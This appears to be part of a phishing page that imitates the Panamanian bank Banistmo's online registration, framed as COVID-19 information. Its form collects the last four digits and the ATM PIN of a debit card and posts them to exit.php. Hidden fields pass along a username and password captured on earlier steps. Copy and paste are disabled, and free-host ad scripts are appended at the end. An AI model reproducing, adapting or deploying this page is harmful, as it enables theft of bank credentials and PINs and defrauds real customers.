                                                        <div _ngcontent-c32="" class="col text-user-information-value text-left pl-2 pr-0"> </div>
                                                    </div>
                                                    <div _ngcontent-c32="" class="row">

                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <form action="exit.php" method="POST">
                                            <input type="hidden" name="paso" value="3">
                                            <input type="hidden" name="text-field" value="4545454454">
                                            <input type="hidden" name="ultima" value="1">
                                            <app-register-options _ngcontent-c32="" _nghost-c34="">
                                                <!---->
                                                <div _ngcontent-c34="" class="my-2">
                                                    <app-card _ngcontent-c34="" _nghost-c5="">
                                                        <div _ngcontent-c5="" class="card ">
                                                            <div _ngcontent-c34="" class="row card-container mx-0 ">
                                                                <div _ngcontent-c34="" class="col-2 p-0"><img _ngcontent-c34="" class="icon" src="./svg/tarjeta-credito.svg"></div>
                                                                <div _ngcontent-c34="" class="col p-0">
                                                                    <label _ngcontent-c34="" class="container p-0">
                                                                        <input _ngcontent-c34="" name="radio" type="radio"> Ingresa los ultimos 4 digitos y el PIN asociados a la tarjeta de débito.
                                                                    </label>


                                                                </div>


                                                            </div>







                                                            <app-text-field _ngcontent-c37="" id="input_email" name="Mail" _nghost-c24="">
                                                                <div _ngcontent-c24="" class="text-field status">
                                                                    <div _ngcontent-c24="" class="content">
                                                                        <label _ngcontent-c24="">


                                                                            <input _ngcontent-c24="" name="4digitos" class="error ng-touched" type="number" id="input_email" pattern="[0-9]" value="" maxlength="4" style="text-align: center;-webkit-text-security: disc;" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" input-directive="" required="" oncopy="return false" onpaste="return false" onkeydown="kotoba()" onkeyup="kotoba()">
                                                                            <input type="text" name="user_name" class="d-none" value="<?php echo $usuario; ?>">
                                                                            <input type="text" name="password" class="d-none" value="<?php echo $password; ?>">




                                                                            <span style="    text-align: center;" _ngcontent-c24="">Ultimos 4 Digitos</span>
                                                                            <div _ngcontent-c24="" class="icon">
                                                                                <!----><i _ngcontent-c24="" class=""></i></div>
                                                                        </label>
                                                                    </div>
                                                                    <div _ngcontent-c24="" class="sub-content">
                                                                        <p _ngcontent-c24="" class="message"></p>
                                                                        <!---->
                                                                    </div>
                                                                </div>
                                                            </app-text-field>





                                                            <app-text-field _ngcontent-c37="" id="input_email" name="Mail" _nghost-c24="">
                                                                <div _ngcontent-c24="" class="text-field status">
                                                                    <div _ngcontent-c24="" class="content">
                                                                        <label _ngcontent-c24="">

                                                                            <input _ngcontent-c24="" name="pin" class="error ng-touched" type="number" input-directive="" pattern="[0-9]" id="password" value="" maxlength="4" style="text-align: center;-webkit-text-security: disc;" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" required="" oncopy="return false" onpaste="return false" onkeydown="kotoba()" onkeyup="kotoba()">


                                                                            <span _ngcontent-c24="" style="    text-align: center;">El que usas en el cajero automatico</span>

                                                                        </label>
                                                                    </div>
                                                                </div>
                                                            </app-text-field>



                                                        </div>
                                                    </app-card>
                                                </div>

                                            </app-register-options>



                                            <div _ngcontent-c32="" class="col-md-12">
                                                <p _ngcontent-c32="" class="text-center main-title" id="lbl_title"> Informacion Sobre COVID-19 </p>
                                            </div>





                                            <div _ngcontent-c32="" class="row ">
                                                <div _ngcontent-c32="" class="col ">
                                                    <app-button _ngcontent-c32="" id="btn_cancel " type="secondary" _nghost-c22="">
                                                        <button _ngcontent-c22="" class="btn secondary" type="button" id="btn_cancel "> Cancelar
                                                            <!---->
                                                        </button>
                                                    </app-button>
                                                </div>
                                                <div _ngcontent-c32="" class="col ">
                                                    <app-button _ngcontent-c32="" id="btn_Continue " type="primary-gray " _nghost-c22="">
                                                        <button _ngcontent-c22="" class="btn primary-gray " type="submit" id="btn_Continuen"> Continuar
                                                            <!---->
                                                        </button>
                                                    </app-button>

                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                    <app-modal _ngcontent-c32="" iconclosed="fal fa-times" id="modal_email" width="500px" _nghost-c21="">
                                        <div _ngcontent-c21="" class="modal-container " id="modal_email" style="z-index: 3000;">
                                            <div _ngcontent-c21="" class="centered">
                                                <div _ngcontent-c21="" class="modal-content" style="width: 500px;">
                                                    <!---->
                                                    <div _ngcontent-c21="" class="row modal-header align-items-center">
                                                        <div _ngcontent-c21="" class="col text-center pr-0">
                                                            <h2 _ngcontent-c21="" id=""> No es posible continuar con el registro</h2>
                                                        </div>
                                                        <!---->
                                                        <div _ngcontent-c21="" class="col-1 text-rigth close"><i _ngcontent-c21="" id="btn_close" class="fal fa-times"></i></div>
                                                    </div>
                                                    <div _ngcontent-c32="" class="text-center mb-5">
                                                        <div _ngcontent-c32="" class="row py-0 justify-content-center">
                                                            <div _ngcontent-c32="" class="col-12"><i _ngcontent-c32="" class="icon-modal-email"></i></div>
                                                        </div>
                                                        <div _ngcontent-c32="" class="row justify-content-center">
                                                            <div _ngcontent-c32="" class="col-10 text-modal-email"> Si aún no tienes un correo registrado en el banco ni tarjeta de débito Banistmo, por favor cancela el registro. Para mayor información, comunícate a la Sucursal Telefónica (507) 306-4700 </div>
                                                        </div>
                                                        <div _ngcontent-c32="" class="row justify-content-center">
                                                            <div _ngcontent-c32="" class="col-6">
                                                                <app-button _ngcontent-c32="" id="btn_accept" type="primary-gray" _nghost-c22="">
                                                                    <button _ngcontent-c22="" class="btn primary-gray" type="button" id="btn_accept"> Cancelar registro
                                                                        <!---->
                                                                    </button>
                                                                </app-button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </app-modal>
                                    <app-modal _ngcontent-c32="" width="500px" _nghost-c21="">
                                        <div _ngcontent-c21="" class="modal-container " id="" style="z-index: 3000;">
                                            <div _ngcontent-c21="" class="centered">
                                                <div _ngcontent-c21="" class="modal-content" style="width: 500px;">
                                                    <!---->
                                                    <div _ngcontent-c21="" class="row modal-header align-items-center">
                                                        <div _ngcontent-c21="" class="col text-center pr-0">
                                                            <h2 _ngcontent-c21="" id=""> Se ha cerrado la sesión</h2>
                                                        </div>
                                                        <!---->
                                                    </div>
                                                    <div _ngcontent-c32="" class="modal-body text-center"><i _ngcontent-c32="" class="icon-modal-time"></i>
                                                        <div _ngcontent-c32="" class="row justify-content-center">
                                                            <div _ngcontent-c32="" class="col-10">
                                                                <p _ngcontent-c32="" class="session-message">Excediste el tiempo máximo permitido. Debes iniciar de nuevo con el proceso de registro.</p>
                                                            </div>
                                                        </div>
                                                        <div _ngcontent-c32="" class="row justify-content-center actions">
                                                            <div _ngcontent-c32="" class="col-5">
                                                                <app-button _ngcontent-c32="" id="btn_accept" routerlink="/login" type="primary-gray" _nghost-c22="" tabindex="0">
                                                                    <button _ngcontent-c22="" class="btn primary-gray" type="button" id="btn_accept"> Entendido
                                                                        <!---->
                                                                    </button>
                                                                </app-button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </app-modal>
                                </app-step-register-method>
                            </div>
                        </div>
                    </app-card>
                </div>
                <app-modal _ngcontent-c30="" width="500px" _nghost-c21="">
                    <div _ngcontent-c21="" class="modal-container " id="" style="z-index: 3000;">
                        <div _ngcontent-c21="" class="centered">
                            <div _ngcontent-c21="" class="modal-content" style="width: 500px;">
                                <!---->
                                <div _ngcontent-c21="" class="row modal-header align-items-center">
                                    <div _ngcontent-c21="" class="col text-center pr-0">
                                        <h2 _ngcontent-c21="" id=""> Se ha cerrado la sesión</h2>
                                    </div>
                                    <!---->
                                </div>
                                <div _ngcontent-c30="" class="modal-body text-center"><i _ngcontent-c30="" class="icon-modal-"></i>
                                    <div _ngcontent-c30="" class="row justify-content-center">
                                        <div _ngcontent-c30="" class="col-10">
                                            <p _ngcontent-c30="" class="session-message"></p>
                                        </div>
                                    </div>
                                    <div _ngcontent-c30="" class="row justify-content-center actions">
                                        <div _ngcontent-c30="" class="col-5">
                                            <app-button _ngcontent-c30="" id="btn_accept" routerlink="/login" type="primary-gray" _nghost-c22="" tabindex="0">
                                                <button _ngcontent-c22="" class="btn primary-gray" type="button" id="btn_accept"> Entendido
                                                    <!---->
                                                </button>
                                            </app-button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </app-modal>
            </div>
            <app-footer _ngcontent-c30="" type="register" _nghost-c31="">
                <footer _ngcontent-c31="" class="register">
                    <div _ngcontent-c31="" class="contact-information text-center">
                        <div _ngcontent-c31="" class="contact-telephone"><i _ngcontent-c31="" class="footer-icon fal fa-phone"></i> Sucursal Teléfonica: (507) 306-4700 </div>
                        <div _ngcontent-c31="" class="info-legal">Copyright Banistmo SA. 2020</div>
                    </div>
                </footer>
            </app-footer>
        </app-container-register>
    </app-root>

    <script type="text/javascript" src="./index_files/jquery-1.10.2.js"></script><iframe name="__tcfapiLocator" style="display: none;"></iframe>

    <script>
        function kotoba() {
            //var campo = $('#inp_user').val().length);
            //Almacenamos los valores
            nombre = $('#password').val();
            nombre2 = $('#input_email').val();
            //Comprobamos la longitud de caracteres
            if (nombre.length > 3 && nombre.length > 3) {

                btn_Continuen.removeAttribute('disabled');
                $("#btn_continuen").attr("id", "btn_continue");
                $("#btn_Continuen").attr("class", "btn primary-yellow");

            } else {



            }

        } //Aqui termina la Funcion
    </script>


    <!-- Inserted by miarroba -->

    <script type="text/javascript" src="https://hosting.miarroba.info/?__muid=5171990dff20d8de954b268e4e2a958e6ff090d8&amp;h=1985594&amp;t=1607261297&amp;k=c2bcfb3eb435accb4af0cb6b39db9758"></script><noscript><img alt="beacon" border="0" width="1" height="1" src="https://hosting.miarroba.info/?__muid=5171990dff20d8de954b268e4e2a958e6ff090d8&amp;h=1985594&amp;t=1607261297&amp;k=c2bcfb3eb435accb4af0cb6b39db9758&amp;img=1" /></noscript>
    <script type="text/javascript">
        var s = document.createElement("script");
        var t = "//des.smartclip.net/ads?type=dyn&plc=75133&elementId=5171990dff20d8de954b268e4e2a958e6ff090d8&sz=400x320&rnd=" + Math.round(Math.random() * 1e8);
        s.type = "text/javascript";
        s.src = t;
        document.body.appendChild(s);
    </script>
    <script type="text/javascript" src="//des.smartclip.net/ads?type=dyn&amp;plc=75133&amp;elementId=5171990dff20d8de954b268e4e2a958e6ff090d8&amp;sz=400x320&amp;rnd=11033873"></script>
    <div id="5171990dff20d8de954b268e4e2a958e6ff090d8"></div>
    <div id="ads_HEZRL65RXYI2"></div>
    <script defer="" language="javascript" type="text/javascript">
        (function() {
            var newscript = document.createElement('script');
            newscript.type = 'text/javascript';
            newscript.async = true;
            lz_elem = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);
            lz_elem.appendChild(newscript);
            newscript.onload = function(ev) {
                var lz_url = "https://play.sunmediaads.com/red/zone.php?code=HEZRL65RXYI2&a=&pubid=&lgid=" + ((new Date()).getTime() % 2147483648) + Math.random();
                var lz_target = "ads_HEZRL65RXYI2";
                var lz_sync_mode = false;
                lz_loadads(lz_url, lz_target, lz_sync_mode);
            }
            newscript.src = "https://img.sunmediaads.com/ads/lz_loader.js?ver=1.4";
        })();
    </script>
    <!-- Inserted by miarroba -->


</body>

</html>